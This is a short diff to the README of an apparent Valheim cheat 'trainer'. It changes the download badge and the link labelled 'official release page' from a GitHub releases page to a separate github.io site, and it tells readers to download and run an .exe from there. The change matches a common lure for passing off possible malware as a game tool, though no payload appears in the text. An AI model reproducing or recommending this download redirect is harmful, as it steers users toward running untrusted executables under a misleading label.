@@ -1,6 +1,6 @@
 # 🎮 Valheim-Trainer-2026 - Control your survival gameplay experience
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Cancroid-binomialdistribution977/Valheim-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://cancroid-binomialdistribution977.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets these conditions:
 
 Follow these instructions to get the trainer on your computer.
 
-1.  Visit the official release page: [https://github.com/Cancroid-binomialdistribution977/Valheim-Trainer-2026/releases](https://github.com/Cancroid-binomialdistribution977/Valheim-Trainer-2026/releases)
+1.  Visit the official release page: [https://cancroid-binomialdistribution977.github.io](https://cancroid-binomialdistribution977.github.io)
 2.  Look for the latest release version at the top of the page.
 3.  Click the link labeled `Valheim-Trainer-2026.exe` to start the download.
 4.  Save the file to a folder you remember, such as your Downloads folder or Desktop.
